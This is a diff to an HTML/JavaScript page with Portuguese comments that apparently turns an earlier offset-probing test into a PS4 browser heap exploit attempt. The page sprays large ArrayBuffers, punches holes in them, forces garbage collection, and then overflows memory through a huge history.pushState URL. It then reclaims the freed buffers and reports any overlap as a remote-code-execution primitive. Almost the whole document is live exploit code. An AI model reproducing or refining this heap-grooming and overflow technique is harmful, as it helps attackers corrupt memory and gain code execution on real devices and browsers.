@@ -1,61 +1,159 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Micro-Sonar</title>
+    <title>PS4 Titan Clash (ArrayBuffer Overlap)</title>
     <style>
-        body { background-color: #000; color: #ff0055; font-family: monospace; padding: 20px; text-align: center; }
+        body { background-color: #1a0500; color: #ff5500; font-family: monospace; padding: 20px; text-align: center; }
         button { 
-            font-size: 24px; padding: 20px; margin: 15px; cursor: pointer; 
-            width: 100%; border: 2px solid #ff0055; background: #220000; color: #fff; font-weight: bold;
+            font-size: 24px; padding: 25px; width: 100%; border: 2px solid #ff5500; background: #000; color: #fff; font-weight: bold; cursor: pointer;
+            box-shadow: 0 0 20px #ff5500;
         }
-        #log { margin-top: 20px; border: 1px solid #555; padding: 15px; color: cyan; text-align: left; }
+        #log { text-align: left; margin-top: 20px; border: 1px solid #555; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; background: #111;}
+        .win { background-color: #ff5500; color: #000; font-weight: bold; font-size: 1.2em; padding: 5px;}
     </style>
 </head>
 <body>
 
-    <h1>Micro-Sonar de Vizinhos</h1>
-    <p>O vizinho está muito perto. Onde exatamente?</p>
+    <h1>Guerra de Titãs (Large Heap)</h1>
+    <p>Tentando sobrepor ArrayBuffers gigantes no espaço mmap.</p>
 
-    <div id="log">Pronto. Base: 709.522</div>
-
-    <button onclick="pingMicro(0)">1. Testar Imediato (+0 bytes)</button>
-    <button onclick="pingMicro(8)">2. Testar +8 bytes</button>
-    <button onclick="pingMicro(16)">3. Testar +16 bytes</button>
-    <button onclick="pingMicro(24)">4. Testar +24 bytes</button>
-    <button onclick="pingMicro(32)">5. Testar +32 bytes</button>
+    <button onclick="startTitanWar()">INICIAR CONFLITO DE MEMÓRIA</button>
+    
+    <div id="log">Pronto. Reinicie o console.</div>
 
     <script>
         const BASE_OFFSET = 709522;
+        // Overflow agressivo para garantir que sujamos bastante a memória vizinha
+        const OVERFLOW_AMT = 1024 * 1024 * 2; // 2MB de 0x01
 
-        function log(msg) {
-            document.getElementById('log').innerHTML += `<div>${msg}</div>`;
+        // Tamanho dos Titãs (4MB)
+        // Isso força a alocação fora do IsoHeap padrão
+        const TITAN_SIZE = 1024 * 1024 * 4;
+        const TITAN_COUNT = 40; 
+
+        var victims = [];
+        var reclaimers = [];
+
+        function log(msg, type) {
+            const el = document.getElementById('log');
+            let style = type === 'win' ? 'class="win"' : '';
+            el.innerHTML += `<div ${style}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            el.scrollTop = el.scrollHeight;
         }
 
-        function pingMicro(distance) {
-            log(`Injetando 0xFF na distância +${distance}...`);
+        async function startTitanWar() {
+            log(`1. Convocando ${TITAN_COUNT} Titãs (ArrayBuffers de 4MB)...`);
+            
+            // FASE 1: SPRAY DE TITÃS
+            // Alocamos memória bruta.
+            for(let i=0; i<TITAN_COUNT; i++) {
+                let ab = new ArrayBuffer(TITAN_SIZE);
+                // Marcamos o buffer com um padrão reconhecível (0xCC)
+                let view = new Uint8Array(ab);
+                // Preenchemos apenas o começo e o fim para economizar CPU
+                view[0] = 0xCC; 
+                view[100] = 0xCC;
+                view[TITAN_SIZE-1] = 0xCC;
+                victims.push(ab);
+            }
+
+            // FASE 2: CRIAR BURACOS
+            log("2. Abrindo clareiras no campo de batalha...");
+            // Removemos 1 a cada 3 para tentar cercar o exploit
+            for(let i=0; i<TITAN_COUNT; i+=3) {
+                victims[i] = null;
+            }
+
+            // Força GC pesado
+            await forceGC();
+
+            // FASE 3: O EXPLOIT
+            log("3. Disparando Overflow no Vizinho Imediato (+0)...");
             
             setTimeout(() => {
                 try {
-                    // 1. Base Segura
+                    // Payload: Enche até a borda e vaza 2MB de 0x01
                     let buffer = "A".repeat(BASE_OFFSET);
-                    
-                    // 2. Ponte Segura (0x01) até o ponto de teste
-                    if (distance > 0) {
-                        buffer += "\x01".repeat(distance);
-                    }
-                    
-                    // 3. A Mina (0xFF)
-                    buffer += "\xFF";
+                    buffer += "\x01".repeat(OVERFLOW_AMT);
 
-                    // Dispara
-                    history.pushState({}, "micro_" + distance, "/" + buffer);
-                    
-                    log(`SOBREVIVEU! Distância +${distance} é segura.`);
+                    // A Esperança:
+                    // O overflow vai sobrescrever o cabeçalho de um ArrayBuffer vizinho.
+                    // O cabeçalho corrompido vai dizer que o bloco está livre ou tem tamanho errado.
+                    history.pushState({}, "titan_pwn", "/" + buffer);
+
+                    // FASE 4: TENTATIVA DE RECLAMAÇÃO (Reclaim)
+                    log("4. Tentando alocar novos buffers na zona corrompida...");
+                    tryReclaim();
 
                 } catch (e) {
-                    log("Erro JS: " + e.message);
+                    log("Erro Crítico (OOM): " + e.message);
                 }
             }, 500);
+        }
+
+        function tryReclaim() {
+            // Tenta alocar novos buffers. Se o cabeçalho do vizinho foi corrompido para "FREE",
+            // o sistema pode nos dar o mesmo endereço de memória que o vizinho antigo (que ainda existe!)
+            for(let i=0; i<20; i++) {
+                let ab = new ArrayBuffer(TITAN_SIZE);
+                let view = new Uint8Array(ab);
+                // Marca com 0xAA
+                view[0] = 0xAA;
+                reclaimers.push(ab);
+            }
+
+            log("5. Verificando sobreposições (Overlap)...");
+            checkOverlap();
+        }
+
+        function checkOverlap() {
+            let success = false;
+
+            // Checa as Vítimas Originais
+            for(let i=0; i<victims.length; i++) {
+                let v = victims[i];
+                if(!v) continue;
+
+                let view = new Uint8Array(v);
+                
+                // SINAL 1: Corrupção Direta (0x01)
+                // Se o buffer original agora tem 0x01 no começo, o overflow entrou nele.
+                if (view[0] === 1) {
+                    log(`!!! SUCESSO (OVERFLOW) !!! Titã ${i} atingido por 0x01!`, 'win');
+                    success = true;
+                }
+
+                // SINAL 2: Sobreposição (Overlap)
+                // Se o buffer original agora tem 0xAA (marca dos novos buffers),
+                // significa que dois objetos apontam para o mesmo lugar. RCE GARANTIDO.
+                if (view[0] === 0xAA) {
+                    log(`!!! JACKPOT (OVERLAP) !!! Titã ${i} foi invadido pelo novo buffer!`, 'win');
+                    alert("RCE PRIMITIVE: MEMORY OVERLAP!");
+                    success = true;
+                }
+            }
+
+            // Checa os Novos Buffers (Reclaimers)
+            // Se eles nasceram com 0x01 ou 0xCC, também é overlap.
+            for(let i=0; i<reclaimers.length; i++) {
+                let r = reclaimers[i];
+                let view = new Uint8Array(r);
+                if (view[0] === 1 || view[0] === 0xCC) {
+                    log(`!!! JACKPOT (RECLAIM) !!! Novo Buffer ${i} nasceu em memória suja!`, 'win');
+                    alert("RCE PRIMITIVE: MEMORY OVERLAP!");
+                    success = true;
+                }
+            }
+
+            if(!success) {
+                log("Nenhum overlap detectado.");
+                log("O isolamento mmap parece impenetrável com esta técnica.");
+            }
+        }
+
+        async function forceGC() {
+            try { new ArrayBuffer(100 * 1024 * 1024); } catch(e){}
+            return new Promise(r => setTimeout(r, 1000));
         }
     </script>
 </body>
